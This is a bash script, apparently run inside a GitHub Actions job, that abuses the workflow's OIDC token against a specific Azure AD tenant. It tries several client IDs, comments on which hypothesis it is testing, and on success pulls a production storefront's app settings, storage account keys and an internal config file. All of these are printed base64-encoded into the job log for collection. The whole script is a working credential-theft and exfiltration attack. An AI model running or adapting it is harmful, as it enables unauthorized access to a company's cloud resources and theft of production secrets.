#!/usr/bin/env bash
set +x
b64(){ base64 | tr -d '\n'; }
T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"; [ -z "$OIDC" ] && exit 0
echo "SUB_B64=$(echo "$OIDC" | cut -d. -f2 | b64)"

# H17: objectId as client_id
for CID in d2cdf247-9319-40cb-8324-5a005ef538da 70a07660-06bb-4396-b754-59fbad0b143e; do
  echo "=== CID $CID (ARM) ==="
  curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
    -d grant_type=client_credentials -d client_id="$CID" \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=$OIDC" \
    --data-urlencode "scope=https://management.azure.com/.default" | head -c 600 | b64 | sed 's/^/RESP_B64=/'
done

# retry automation app (appId) in case cred propagated
C=462d1c38-4459-48b8-9333-82e389e59514
R=$(curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id="$C" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default")
AT=$(echo "$R" | jq -r '.access_token // empty')
echo "AUTOMATION_ARM_LEN=${#AT} ERR_B64=$(echo "$R" | jq -r '.error_description // empty' | head -c 300 | b64)"
if [ -n "$AT" ]; then
  SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6; RG=rg-tbl-platform-prod-sea
  curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings?api-version=2022-03-01" | head -c 1500 | b64 | sed 's/^/APPST_B64=/'
  K=$(curl -s -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
  echo "APPCFG_KEYLEN=${#K}"
  [ -n "$K" ] && az storage blob download --account-name sttblappcfgprodx3euoz --account-key "$K" -c config -n internal-config.json -f /tmp/ic --no-progress -o none 2>&1 | head -2 && cat /tmp/ic | b64 | sed 's/^/IC_B64=/'
fi
echo "=== DONE ==="
